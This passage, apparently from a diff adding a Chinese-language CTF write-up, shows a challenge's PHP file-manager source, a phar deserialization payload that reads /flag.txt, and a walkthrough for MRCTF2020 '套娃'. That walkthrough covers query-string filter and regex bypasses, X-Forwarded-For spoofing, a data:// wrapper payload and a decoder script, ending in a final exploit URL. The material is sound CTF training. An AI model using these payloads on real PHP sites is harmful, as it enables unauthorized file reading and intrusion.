+        $stmt->bind_param("ss", $username, $password);
+        $stmt->execute();
+        return true;
+    }
+
+    public function verify_user($username, $password) {
+        if (!$this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->bind_result($expect);
+        $stmt->fetch();
+        if (isset($expect) && $expect === $password) {
+            return true;
+        }
+        return false;
+    }
+
+    public function __destruct() {
+        $this->db->close();
+    }
+}
+
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct($path) {
+        $this->files = array();
+        $this->results = array();
+        $this->funcs = array();
+        $filenames = scandir($path);
+
+        $key = array_search(".", $filenames);
+        unset($filenames[$key]);
+        $key = array_search("..", $filenames);
+        unset($filenames[$key]);
+
+        foreach ($filenames as $filename) {
+            $file = new File();
+            $file->open($path . $filename);
+            array_push($this->files, $file);
+            $this->results[$file->name()] = array();
+        }
+    }
+
+    public function __call($func, $args) {
+        array_push($this->funcs, $func);
+        foreach ($this->files as $file) {
+            $this->results[$file->name()][$func] = $file->$func();
+        }
+    }
+
+    public function __destruct() {
+        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
+        $table .= '<thead><tr>';
+        foreach ($this->funcs as $func) {
+            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
+        }
+        $table .= '<th scope="col" class="text-center">Opt</th>';
+        $table .= '</thead><tbody>';
+        foreach ($this->results as $filename => $result) {
+            $table .= '<tr>';
+            foreach ($result as $func => $value) {
+                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
+            }
+            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
+            $table .= '</tr>';
+        }
+        echo $table;
+    }
+}
+
+class File {
+    public $filename;
+
+    public function open($filename) {
+        $this->filename = $filename;
+        if (file_exists($filename) && !is_dir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function name() {
+        return basename($this->filename);
+    }
+
+    public function size() {
+        $size = filesize($this->filename);
+        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
+        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    }
+
+    public function detele() {
+        unlink($this->filename);
+    }
+
+    public function close() {
+        return file_get_contents($this->filename);
+    }
+}
+?>
+
+~~~
+
+`delete.php`:
+
+~~~php
+<?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header("Location: login.php");
+    die();
+}
+
+if (!isset($_POST['filename'])) {
+    die();
+}
+
+include "class.php";
+
+chdir($_SESSION['sandbox']);
+$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) < 40 && $file->open($filename)) {
+    $file->detele();
+    Header("Content-type: application/json");
+    $response = array("success" => true, "error" => "");
+    echo json_encode($response);
+} else {
+    Header("Content-type: application/json");
+    $response = array("success" => false, "error" => "File not exist");
+    echo json_encode($response);
+}
+?>
+
+~~~
+
+payload:
+
+~~~
+<?php
+class User {
+    public $db;
+}
+class File {
+    public $filename;
+}
+class FileList {
+    private $files;
+    public function __construct() {
+        $file = new File();
+        $file->filename = "/flag.txt";
+        $this->files = array($file);
+    }
+}
+
+$a = new User();
+$a->db = new FileList();
+
+$phar = new Phar("phar.phar"); //后缀名必须为phar
+
+$phar->startBuffering();
+
+$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
+
+$o = new User();
+$o->db = new FileList();
+
+$phar->setMetadata($a); //将自定义的meta-data存入manifest
+$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+//phpinfo();
+?>
+~~~
+
+
+
+![image-20210609212842922](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210609212842922.png)
+
+https://xz.aliyun.com/t/2715
+
+### [MRCTF2020]套娃
+
+![image-20210610135112036](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210610135112036.png)
+
+查看源码发现了注释
+
+~~~php
+//1st
+$query = $_SERVER['QUERY_STRING'];
+// substr_count() 函数计算子串在字符串中出现的次数。%5f也是_
+ if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
+    die('Y0u are So cutE!');
+}
+ if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
+    echo "you are going to the next ~";
+}
+~~~
+
+> $_SERVER["QUERY_STRING"]
+>
+> 　　说明：查询(query)的字符串
+>
+> 例子：[http://www.xxx.com/index.php?p=222&q=u](http://www.xxx.com/index.php?p=222&q=biuuu)
+>
+> 　　结果：
+>
+> 　　$_SERVER["QUERY_STRING"] = “p=222&q=u”
+
+![img](CTF%E5%88%B7%E9%A2%98WriteUp.assets/20210208104700561.png)
+
+绕过`_`和正则表达式。payload:用%20代替_  用%0a(换行符的url编码)绕过正则表达式
+
+~~~
+/?b%20u%20p%20t=23333%0a
+~~~
+
+![image-20210610140619452](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210610140619452.png)
+
+secrettw.php
+
+![image-20210610140656666](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210610140656666.png)
+
+注释是jsFuck，在控制台执行
+
+![image-20210610141708586](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210610141708586.png)
+
+post一个参数，还要修改XFF为127.0.0.1
+
+![image-20210610141735986](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210610141735986.png)
+
+~~~php
+<?php 
+error_reporting(0); 
+include 'takeip.php';
+ini_set('open_basedir','.'); 
+include 'flag.php';
+
+if(isset($_POST['Merak'])){ 
+    highlight_file(__FILE__); 
+    die(); 
+} 
+
+
+function change($v){ 
+    $v = base64_decode($v); 
+    $re = ''; 
+    for($i=0;$i<strlen($v);$i++){  //ord() 函数返回字符串的首个字符的 ASCII 值。
+        $re .= chr ( ord ($v[$i]) + $i*2 );  //chr() 函数从指定的 ASCII 值返回字符。
+    } 
+    return $re; 
+}
+echo 'Local access only!'."<br/>";
+$ip = getIp();
+if($ip!='127.0.0.1')
+echo "Sorry,you don't have permission!  Your ip is :".$ip;
+if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
+echo "Your REQUEST is:".change($_GET['file']);
+echo file_get_contents(change($_GET['file'])); }
+?>
+~~~
+
+2333参数传递利用php的data伪协议
+
+~~~
+?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=
+~~~
 
 
 
 
+
+change函数payload：
+
+~~~php
+
+<?php
+
+function change($v){
+    $v = base64_decode($v);
+    $re = '';
+    for($i=0;$i<strlen($v);$i++){
+        $re .= chr ( ord ($v[$i]) + $i*2 );
+    }
+    return $re;
+}
+function dechange($v){
+    $re = '';
+    for($i=0;$i<strlen($v);$i++){
+        $re .= chr ( ord ($v[$i]) - $i*2 );
+    }
+    $re = base64_encode($re);
+
+    return $re;
+}
+$s = 'flag.php';
+$ss = 'ZmpdYSZmXGI=';
+echo change($ss);
+echo('---------');
+echo dechange($s);
+?>
+~~~
+
+最终的payload：
+
+~~~
+/secrettw.php?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&file=ZmpdYSZmXGI=
+~~~
+
+![image-20210610145451388](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210610145451388.png)
